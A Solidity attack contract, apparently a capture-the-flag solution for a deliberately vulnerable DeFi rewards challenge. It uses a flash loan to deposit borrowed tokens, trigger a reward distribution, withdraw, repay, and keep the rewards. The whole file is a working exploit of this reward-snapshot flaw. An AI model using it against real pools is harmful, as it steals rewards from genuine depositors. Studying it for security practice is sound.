// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

interface RewardPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface LoanPool {
    function flashLoan(uint256 amount) external;
}

contract RewarderAttacker {
    using Address for address;
    address public target;
    address public flashPool;
    address public dvtToken;
    address public rewardToken;

    constructor(
        address _target,
        address _flashPool,
        address _dvtToken,
        address _rewardToken
    ) {
        target = _target;
        flashPool = _flashPool;
        dvtToken = _dvtToken;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approve
        // console.log("CONTRACT::: Getting Approval");
        ERC20(dvtToken).approve(target, amount);
        // console.log("CONTRACT::: Approved!");

        // Deposit
        // console.log("CONTRACT::: Depositing...!");
        RewardPool(target).deposit(amount);
        // console.log("CONTRACT::: Deposited!");

        // get reward
        RewardPool(target).distributeRewards();
        // console.log("CONTRACT::: Reward Ditributed!");

        // Withdraw
        RewardPool(target).withdraw(amount);
        // console.log("CONTRACT::: Withdrawn Tokens!");

        ERC20(dvtToken).transfer(flashPool, amount);
        // console.log("CONTRACT:: Returned loan");
    }

    function attack() public {
        uint256 flashBal = ERC20(dvtToken).balanceOf(flashPool);
        LoanPool(flashPool).flashLoan(flashBal);

        uint256 rewBal = ERC20(rewardToken).balanceOf(address(this));
        ERC20(rewardToken).transfer(msg.sender, rewBal);
        // console.log("CONTRACT::: Transferred Reward");
    }
}
